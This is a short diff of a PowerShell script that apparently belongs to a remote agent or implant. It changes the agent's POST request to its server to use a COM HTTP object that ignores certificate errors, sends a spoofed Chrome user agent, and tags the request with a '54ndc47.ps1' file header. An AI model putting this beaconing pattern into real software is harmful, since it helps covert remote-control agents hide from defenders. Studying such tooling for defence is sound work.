@@ -14,9 +14,14 @@ function make-Request($ps_version, $r_endpoint, $r_body){
         return irm "$server$r_endpoint" -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Method POST -Body $r_body -SkipCertificateCheck
     }
     else{
-        $web_client = Make-WebClient
-        $web_client.Headers.add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
-        return $web_client.UploadString("$server$r_endpoint",$r_body)
+        $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
+        $web.setOption(2,13056);
+        $web.open("POST", "$server$r_endpoint", $false);
+        $web.setRequestHeader("file","54ndc47.ps1");
+        $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+        $web.setRequestHeader("Content-Length", $r_body.length);
+        $web.Send($r_body);
+        return $web.ResponseText();
     }
 }
 
